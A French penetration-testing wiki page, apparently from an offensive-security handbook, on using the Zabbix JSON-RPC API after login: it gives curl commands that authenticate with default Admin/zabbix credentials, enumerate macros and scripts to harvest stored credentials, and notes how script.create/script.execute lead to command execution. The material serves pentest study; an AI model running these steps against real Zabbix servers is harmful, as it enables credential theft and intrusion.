---
title: "API : l'interface JSON-RPC de Zabbix"
description: "Zabbix expose une API JSON-RPC sur /api_jsonrpc.php qui reflète les capacités de l'interface. Après s'être authentifié avec user.login pour obtenir un jeton (ou en utilisant un jeton d'API), un attaquant pilote toute la plateforme par programmation : énumérant les utilisateurs, hôtes, items, scripts et macros, et, avec des droits suffisants, créant les objets qui mènent à l'exécution de code."
keywords:
  - zabbix api
  - json-rpc
  - user.login
  - api token
  - api_jsonrpc.php
---

# API

L'API Zabbix est un point de terminaison JSON-RPC 2.0 sur `/api_jsonrpc.php` qui expose essentiellement tout ce que l'interface web peut faire, ce qui en fait l'interface principale de l'attaquant une fois l'accès obtenu. L'authentification se fait via `user.login` (qui renvoie un jeton de session utilisé dans le champ `auth` des appels suivants) ou, sur les versions plus récentes, un jeton d'API pré-créé envoyé comme identifiant bearer. Avec un jeton, un attaquant énumère et manipule les objets par programmation : `user.get`, `host.get`, `item.get`, `script.get` et `usermacro.get` lisent l'environnement et ses secrets stockés, et `host.create`/`item.create`/`script.create`/`script.execute` créent les objets utilisés pour l'exécution de code. Scripter l'API est plus rapide et plus discret que l'interface, et c'est ainsi que sont pilotées la plupart des attaques Zabbix post-authentification.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# login -> token
TOK=$(curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}' | jq -r .result)
# enumerate secrets-bearing objects
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"usermacro.get","params":{"output":"extend"},"auth":"'"$TOK"'","id":1}'   # macros (often creds)
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"script.get","params":{"output":"extend"},"auth":"'"$TOK"'","id":1}'
# newer: an API token is sent as a bearer header instead of the auth field
curl -sk $Z -H "$H" -H 'Authorization: Bearer <api-token>' -d '{"jsonrpc":"2.0","method":"host.get","params":{},"id":1}'
```

## Notes d'exploitation

- `user.login` renvoie un jeton de session équivalent à une session connectée ; c'est l'identifiant de tous les appels ultérieurs, et une session/un jeton volé ([Vol de session et de jeton](../authentication/session-and-token-theft.md)) s'y substitue.
- `usermacro.get` est de grande valeur : les macros utilisateur ({$...}) stockent fréquemment les identifiants que Zabbix utilise pour superviser les hôtes (chaînes SNMP, mots de passe SSH/IPMI/BD), de sorte que les lire récolte les identifiants du parc.
- L'API est aussi le pilote d'exécution : avec un rôle suffisant, `script.create` + `script.execute` exécute des commandes sur le serveur/agent, voir [Scripts globaux et scripts d'alerte](../code-execution/global-and-alert-scripts.md).
- Les droits sont limités au rôle, de sorte que ce que l'API renvoie dépend de l'utilisateur ; énumérez `role.get`/`usergroup.get` pour comprendre la portée de l'identité.

## Références

- [Zabbix API reference](https://www.zabbix.com/documentation/current/en/manual/api)
- [HackTricks : Zabbix API](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
